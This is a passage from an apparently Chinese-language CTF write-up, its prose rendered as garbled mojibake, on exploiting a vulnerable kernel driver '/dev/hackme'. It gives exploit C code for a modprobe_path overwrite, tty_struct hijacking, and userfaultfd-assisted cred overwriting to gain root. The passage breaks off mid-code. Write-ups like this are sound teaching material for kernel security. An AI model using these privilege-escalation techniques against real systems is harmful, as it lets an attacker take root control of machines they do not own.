</div><p>æ—¢ç„¶è·å–äº†é©±åŠ¨æ¨¡å—åŠ è½½åœ°å€,é‚£ä¹ˆæ­¤æ—¶åˆ™åˆ©ç”¨<code>å †å—ä»»æ„ç”³è¯·</code>å°†å †å—ç”³è¯·åˆ°<code>poolæ•°ç»„</code>å¤„,ä¹‹ååˆ™å¯ä»¥è¿›è¡Œæ§åˆ¶å †å—æŒ‡é’ˆ,å®ç°ä»»æ„å†™,æ­¤å¤„æˆ‘ä»¬ä¿®æ”¹<code>modprobe_path</code>æŒ‡é’ˆä¸­å­˜æ”¾çš„æ–‡ä»¶åœ°å€ä¸ºæˆ‘ä»¬çš„<code>shell</code>è„šæœ¬,å› ä¸ºæ‰§è¡Œ<code>call_usermodehelper</code>æ—¶ä»¥<code>root</code>æƒé™æ‰§è¡Œ,æ‰€ä»¥å½“æ‰§è¡Œä¸€ä¸ªé”™è¯¯çš„<code>elf</code>æ–‡ä»¶åˆ™ä¼šè§¦å‘æ­¤å‡½æ•°,å¹¶æ‰§è¡Œ<code>modprobe_path</code>æŒ‡å‘çš„æ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="s">&#34;/home/pwn/copy.sh</span><span class="se">\0</span><span class="s">&#34;</span><span class="p">,</span><span class="mi">18</span><span class="p">);</span>
	
	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
	<span class="cm">/*
</span><span class="cm">		#!/bin/sh
</span><span class="cm">		/bin/cp /flag /home/pwn/flag
</span><span class="cm">		/bin/chmod 777 /home/pwn/flag
</span><span class="cm">	*/</span>
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;echo -ne &#39;#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/cp /flag /home/pwn/flag</span><span class="se">\n</span><span class="s">/bin/chmod 777 /home/pwn/flag&#39; &gt; /home/pwn/copy.sh&#34;</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /home/pwn/copy.sh&#34;</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;echo -ne &#39;</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff&#39; &gt; /home/pwn/dummy&#34;</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /home/pwn/dummy&#34;</span><span class="p">);</span>

	<span class="n">system</span><span class="p">(</span><span class="s">&#34;/home/pwn/dummy&#34;</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;cat flag&#34;</span><span class="p">);</span>
	<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="2-åŠ«æŒtty_struct">2. åŠ«æŒtty_struct</h4>
<p>å› ä¸ºæ‰“å¼€<code>/dev/ptmx</code>æ—¶,ä¼šç”³è¯·<code>0x400</code>å¤§å°çš„ç©ºé—´,æ­¤æ—¶é‡Šæ”¾ä¸€ä¸ª0x400çš„å †å—,å½“æ‰“å¼€<code>/dev/ptmx</code>æ—¶ä¼šç”³è¯·å‰é¢é‡Šæ”¾çš„å †å—,å†é…åˆ<code>write_to_kernel</code>ã€<code>read_from_kernel</code>ä»¥åŠ<code>è´Ÿæ•°æº¢å‡º</code>å³å¯ä»<code>tty_struct</code>ç»“æ„ä½“ä¸­è¯»å–åˆ°å†…æ ¸æŒ‡é’ˆå¹¶æ§åˆ¶<code>tty_struct</code>ä¸­çš„<code>tty_operations</code>æŒ‡é’ˆ,ä¹‹åå†æ„å»ºROP Chainå³å¯</p>
<h4 id="3-åˆ©ç”¨userfaultfdæœºåˆ¶ä¿®æ”¹credç»“æ„æ•°æ®">3. åˆ©ç”¨userfaultfdæœºåˆ¶ä¿®æ”¹credç»“æ„æ•°æ®</h4>
<p>é¦–å…ˆ<code>fork</code>200ä¸ªå­è¿›ç¨‹å¹¶è®©æ¯æ¬¡forkçš„å­è¿›ç¨‹åˆ¤æ–­<code>uid==0</code>åæ‰§è¡Œshell,æ­¤è¿‡ç¨‹ä¸­ä¼šç”³è¯·ä¸€å®šç›¸åº”å¤§å°çš„å†…å­˜å­˜æ”¾<code>Credç»“æ„ä½“</code>,è€Œè¿™æ®µå†…å­˜ä½äº<code>kmalloc</code>ç”³è¯·çš„å †å—çš„ä¸Šæ–¹å¤§çº¦<code>0x160000</code>åç§»å·¦å³å¤„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">200</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
			<span class="n">get_root</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
	<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h5 id="credç»“æ„ä½“">Credç»“æ„ä½“</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
    <span class="n">atomic_t</span>    <span class="n">usage</span><span class="p">;</span>
<span class="cp">#ifdef CONFIG_DEBUG_CREDENTIALS
</span><span class="cp"></span>    <span class="n">atomic_t</span>    <span class="n">subscribers</span><span class="p">;</span>    <span class="cm">/* number of processes subscribed */</span>
    <span class="kt">void</span>        <span class="o">*</span><span class="n">put_addr</span><span class="p">;</span>
    <span class="kt">unsigned</span>    <span class="n">magic</span><span class="p">;</span>
<span class="cp">#define CRED_MAGIC  0x43736564
</span><span class="cp">#define CRED_MAGIC_DEAD 0x44656144
</span><span class="cp">#endif
</span><span class="cp"></span>    <span class="n">kuid_t</span>      <span class="n">uid</span><span class="p">;</span>        <span class="cm">/* real UID of the task */</span>
    <span class="n">kgid_t</span>      <span class="n">gid</span><span class="p">;</span>        <span class="cm">/* real GID of the task */</span>
    <span class="n">kuid_t</span>      <span class="n">suid</span><span class="p">;</span>       <span class="cm">/* saved UID of the task */</span>
    <span class="n">kgid_t</span>      <span class="n">sgid</span><span class="p">;</span>       <span class="cm">/* saved GID of the task */</span>
    <span class="n">kuid_t</span>      <span class="n">euid</span><span class="p">;</span>       <span class="cm">/* effective UID of the task */</span>
    <span class="n">kgid_t</span>      <span class="n">egid</span><span class="p">;</span>       <span class="cm">/* effective GID of the task */</span>
    <span class="n">kuid_t</span>      <span class="n">fsuid</span><span class="p">;</span>      <span class="cm">/* UID for VFS ops */</span>
    <span class="n">kgid_t</span>      <span class="n">fsgid</span><span class="p">;</span>      <span class="cm">/* GID for VFS ops */</span>
    <span class="p">......</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p>ä¹‹åé€šè¿‡è´Ÿæº¢è¯»å–ä¸Šæ–¹0x160000åç§»å·¦å³å¤„å¾€åçš„æ•°æ®,ä»ä¸­æœå¯»credç»“æ„ä½“,å› ä¸ºé•œåƒå¯åŠ¨å,ç”¨æˆ·æƒé™æ˜¯<code>1000</code>,æ‰€ä»¥å¯¹åº”Credç»“æ„ä½“ä¸­çš„<code>uid</code>å¼€å§‹çš„<code>8*4</code>å­—èŠ‚éƒ½æ˜¯<code>1000</code>ï¼Œæœç´¢åˆ°ååˆ™ç½®0</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">MAX_DATA_SIZE</span><span class="p">);</span>
	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
	<span class="n">read_from_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">MAX_DATA_SIZE</span><span class="p">,</span> <span class="o">-</span><span class="n">MAX_DATA_SIZE</span><span class="p">);</span>
	<span class="n">uint32_t</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint32_t</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
	<span class="n">uint32_t</span> <span class="n">cred_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] Searching Cred&#34;</span><span class="p">);</span>
	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">SEARCH_SIZE</span><span class="o">/</span><span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">6</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span>
			<span class="n">mem</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1000</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Find A Cred At Offset: %#x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">);</span> <span class="c1">// Searching One Cred And Modify IT TO R00T (: 
</span><span class="c1"></span>			<span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
				<span class="n">mem</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">cred_offset</span> <span class="o">=</span> <span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">cred_offset</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Cannot Find Cred&#34;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>æ—¢ç„¶å·²ç»è·å–å¹¶ä¿®æ”¹äº†å¯¹åº”çš„æ•°æ®,åé¢è¦åšçš„å°±æ˜¯å°†ä¿®æ”¹åçš„æ•°æ®é‡æ–°å†™å›åˆ°å†…æ ¸å¯¹åº”çš„å†…å­˜ä½ç½®,å› ä¸ºå†™å…¥å¤§çº¦0x10000å­—èŠ‚æ•°æ®å,åé¢åˆ™æ˜¯ä¸å¯å†™æ•°æ®æ®µ,ç»§ç»­å†™ä¼šè§¦å‘å†…æ ¸å´©æºƒ,æ‰€ä»¥åœ¨å†™å›ä¹‹å‰,åˆ©ç”¨<code>userfaultfdæœºåˆ¶</code>,åœ¨å†™å…¥<code>0x10000</code>å­—èŠ‚çš„åŒæ—¶,ç›‘æ§<code>0x10000</code>åé¢çš„åœ°å€,å¦‚æœè§¦ç¢°åˆ°ç¼ºé¡µ,åˆ™ä¼šæš‚åœæ•°æ®æ‹·è´,ä¸”æ­¤æ—¶å·²ç»å°†ä¸Šé¢<code>0x10000</code>ä¸­çš„æ•°æ®å†™å›ä¿®æ”¹äº†æŸä¸ªå­è¿›ç¨‹çš„credç»“æ„ä½“,è€Œæ­¤å­è¿›ç¨‹åˆ™ä¼šåˆ¤æ–­<code>uid==0</code>å¹¶æ‰§è¡Œ<code>/bin/sh</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="kt">char</span> <span class="o">*</span><span class="n">new</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">MAX_DATA_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">memcpy</span><span class="p">(</span><span class="n">new</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">SEARCH_SIZE</span><span class="p">);</span>
	<span class="n">fault_page</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint64_t</span><span class="p">)</span><span class="n">new</span> <span class="o">+</span> <span class="n">SEARCH_SIZE</span><span class="p">;</span>
	<span class="n">fault_page_len</span> <span class="o">=</span> <span class="n">MAX_DATA_SIZE</span> <span class="o">-</span> <span class="n">SEARCH_SIZE</span><span class="p">;</span>
	<span class="n">register_userfault</span><span class="p">(</span><span class="n">fault_page</span><span class="p">,</span> <span class="n">fault_page_len</span><span class="p">);</span> <span class="c1">// æ³¨å†Œç¼ºé¡µ,å¦‚æœè®¿é—®åˆ°éæ³•åœ°å€,åˆ™ä¼šæŒ‚èµ·è¿›ç¨‹,é˜²æ­¢å†…æ ¸å´©æºƒ
</span><span class="c1"></span>	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">new</span><span class="p">,</span> <span class="n">MAX_DATA_SIZE</span><span class="p">,</span> <span class="o">-</span><span class="n">MAX_DATA_SIZE</span><span class="p">);</span> <span class="c1">// å½“å†…æ ¸è®¿é—®åˆ°éæ³•åœ°å€æ—¶,credä¸­UIDå·²ç»è¢«ä¿®æ”¹ä¸º0
</span></code></pre></td></tr></table>
</div>
</div><h4 id="4-åˆ©ç”¨userfaultfdæœºåˆ¶å’Œæ¡ä»¶ç«äº‰ä¿®æ”¹tty_struct">4. åˆ©ç”¨userfaultfdæœºåˆ¶å’Œæ¡ä»¶ç«äº‰ä¿®æ”¹tty_struct</h4>
<p>å› ä¸ºåé¢åˆ©ç”¨äº†<code>tty_structç»“æ„</code>æ¥æ„é€ <code>ROP Chain</code>,æ‰€ä»¥é¦–å…ˆä¿å­˜ç”¨æˆ·æ€çš„å‡ ä¸ªå¿…è¦çš„å¯„å­˜å™¨,<code>add</code>ä¸€æ¬¡ç„¶åé‡Šæ”¾æ®‹ç•™ä¸€ä¸ªå¾ˆå¤§çš„size,çˆ¶è¿›ç¨‹<code>sleep(2)</code>,è®©forkçš„å­è¿›ç¨‹å…ˆè¿è¡Œ,å­è¿›ç¨‹ä¼šå…ˆæ³¨å†Œå¹¶ç›‘æ§ç¼ºé¡µå†…å­˜,å­è¿›ç¨‹ä¸­çš„<code>copy_from_user</code>ä¼šå› ä¸ºæ­¤æ—¶ä¼ å…¥åˆ°å†…æ ¸ä¸­çš„ptrå¯¹åº”çš„å†…å­˜æœªåˆå§‹åŒ–,ä»è€Œè§¦ç¢°<code>userfaultfdæœºåˆ¶</code>å¹¶æŒ‚èµ·,æ­¤æ—¶<code>poolæ•°ç»„</code>ä¸­å­˜æœ‰ä¸€ä¸ªæŒ‡é’ˆ,å› ä¸ºé©±åŠ¨ä¸­æ˜¯åœ¨<code>copy_from_user</code>æ‰§è¡Œåæ‰ä¿å­˜æŒ‡é’ˆçš„,æ‰€ä»¥æ®‹ç•™çš„0x200000å¤§å°çš„sizeæ²¡æœ‰è¢«è¦†ç›–æ‰</p>
<pre><code>	*BSS_ptr = k_ptr;
	copy_from_user(k_ptr, User_ptr, Size);
	BSS_ptr[1] = Size;
</code></pre><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">save_status</span><span class="p">();</span>
	<span class="n">uint64_t</span> <span class="n">fault_page</span><span class="p">,</span><span class="n">fault_page_len</span><span class="p">;</span>
	<span class="n">uint64_t</span> <span class="n">kernel_base</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">,</span> <span class="n">ptm_unix98_ops</span> <span class="o">=</span> <span class="mh">0x625D80</span><span class="p">;</span>
	<span class="n">size_t</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
	
	<span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">SEARCH_SIZE</span><span class="p">);</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEARCH_SIZE</span><span class="p">);</span>
	
	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">SEARCH_SIZE</span><span class="p">);</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
       	<span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">uint64_t</span> <span class="n">fault_page</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint64_t</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
        <span class="n">uint64_t</span> <span class="n">fault_page_len</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
        <span class="n">register_userfault</span><span class="p">(</span><span class="n">fault_page</span><span class="p">,</span> <span class="n">fault_page_len</span><span class="p">);</span> <span class="c1">// æ³¨å†Œç›‘è§†ç¼ºé¡µå†…å­˜,é‡åˆ°ç¼ºé¡µåˆ™ä¼šæŒ‚èµ·
</span><span class="c1"></span>        <span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x2E0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> <span class="c1">// ç­‰å¾…å­è¿›ç¨‹è§¦å‘é¡µé”™è¯¯
</span></code></pre></td></tr></table>
</div>
</div><p>ä¹‹ååˆ™æ˜¯åˆ©ç”¨é©±åŠ¨æ¨¡å—ä¸­çš„æŒ‡é’ˆå¹¶æœå¯»å†…å­˜ä¸­tty_structç»“æ„ä½“çš„æ‰€åœ¨ä½ç½®,å› ä¸ºsizeå¾ˆå¤§,æ‰€ä»¥æœå¯»çš„èŒƒå›´ä¹Ÿå¾ˆå¤§,æ‰¾åˆ°tty_structååˆ©ç”¨tty_structä¸­çš„æ•°æ®è®¡ç®—å‡º<code>kernel-base</code>å’Œ<code>å †åœ°å€</code>åˆ™æ˜¯éƒ¨ç½²ä¸€ä¸ª<code>ROP Chain</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">    <span class="n">size_t</span> <span class="n">ptmx_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/ptmx&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;---- Begin TO Find PTMX Struct&#34;</span><span class="p">);</span>
    
    <span class="n">uint64_t</span> <span class="n">evil_buf</span><span class="p">[</span><span class="mh">0x200</span><span class="o">/</span><span class="mi">8</span><span class="p">];</span>
    <span class="n">uint64_t</span> <span class="n">ptmx_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">SEARCH_SIZE</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mh">0x200</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">read_from_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">evil_buf</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mh">0x200</span><span class="o">/</span><span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">evil_buf</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0000000100005401</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">ptmx_offset</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="o">*</span><span class="mi">8</span><span class="p">;</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Have Found PTMX Struct At Offset: %#lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ptmx_offset</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ptmx_offset</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ptmx_offset</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">errExit</span><span class="p">(</span><span class="s">&#34;[-] Cannot find ptmx struct&#34;</span><span class="p">);</span>
    <span class="c1">// é€šè¿‡tty_struct ä¸­çš„æŒ‡é’ˆ ä»è€Œè·å–å † å’Œ å†…æ ¸çš„åœ°å€
</span><span class="c1"></span>    <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">evil_buf</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="n">ptm_unix98_ops</span><span class="p">;</span>
    <span class="n">heap_base</span>   <span class="o">=</span> <span class="n">evil_buf</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x38</span> <span class="o">-</span> <span class="n">ptmx_offset</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Kernel:</span><span class="se">\t</span><span class="s">%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">kernel_base</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;HEAP:</span><span class="se">\t</span><span class="s">%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">heap_base</span><span class="p">);</span>
    <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mh">0x4D3D0</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
    <span class="n">commit_creds</span>        <span class="o">=</span> <span class="mh">0x4D220</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span>
</code></pre></td></tr></table>
